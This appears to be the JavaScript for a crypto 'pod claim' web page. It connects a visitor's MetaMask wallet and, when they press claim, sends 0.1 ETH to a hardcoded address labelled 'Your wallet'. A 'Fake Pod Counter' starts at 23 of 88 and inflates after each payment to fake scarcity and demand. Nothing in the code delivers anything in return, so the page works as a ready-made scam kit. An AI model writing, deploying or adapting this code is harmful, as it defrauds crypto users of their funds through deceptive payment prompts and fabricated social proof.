const { ethers } = window.ethers;

const connectBtn = document.getElementById('connect-btn');
const claimBtn = document.getElementById('claim-btn');
const walletStatus = document.getElementById('wallet-status');
const walletAddressSpan = document.getElementById('wallet-address');
const statusMsg = document.getElementById('status-msg');

let signer;
let userAddress = null;

const RECEIVE_ADDRESS = "0x9411dE226a239f05CeBfDf0b8A7A22e3101d4B09"; // Your wallet

async function connectWallet() {
  if (!window.ethereum) {
    statusMsg.innerText = "Install MetaMask first!";
    statusMsg.className = "status-msg error";
    return;
  }
  try {
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();
    userAddress = await signer.getAddress();
    walletAddressSpan.innerText = userAddress.slice(0,6) + "..." + userAddress.slice(-4);
    walletStatus.style.display = "block";
    connectBtn.style.display = "none";
    claimBtn.disabled = false;
    statusMsg.innerText = "";
  } catch (err) {
    statusMsg.innerText = "Wallet connection rejected.";
    statusMsg.className = "status-msg error";
  }
}

connectBtn.addEventListener('click', connectWallet);

claimBtn.addEventListener('click', async () => {
  if (!signer || !userAddress) return;
  claimBtn.disabled = true;
  statusMsg.innerText = "Processing transaction...";
  statusMsg.className = "status-msg";
  try {
    const tx = await signer.sendTransaction({
      to: RECEIVE_ADDRESS,
      value: ethers.parseEther("0.1")
    });
    await tx.wait();
    statusMsg.innerText = "Success! Pod Claimed. Welcome aboard! 🚀";
    statusMsg.className = "status-msg success";
    incrementFakeCounter();
  } catch (err) {
    statusMsg.innerText = "Transaction cancelled or failed.";
    statusMsg.className = "status-msg error";
  }
  claimBtn.disabled = false;
});

// Fake Pod Counter
const podCounter = document.getElementById('pod-counter');
let fakePods = 23;
function updateCounter() {
  podCounter.innerText = `🌕 ${fakePods}/88 Pods Claimed`;
}
function incrementFakeCounter() {
  if (fakePods < 88) {
    fakePods += 1 + (Math.random() < 0.12 ? 1 : 0);
    updateCounter();
    if (fakePods > 88) fakePods = 88;
  }
}
updateCounter();

// Audio Toggle
const audio = document.getElementById('space-audio');
const audioToggle = document.getElementById('audio-toggle');
const audioIcon = document.getElementById('audio-icon');
let isAudioOn = false;

audioToggle.addEventListener('click', function() {
  isAudioOn = !isAudioOn;
  audioIcon.innerText = isAudioOn ? "🔈" : "🔊";
  if (isAudioOn) {
    audio.volume = 0.4;
    audio.play();
  } else {
    audio.pause();
  }
});
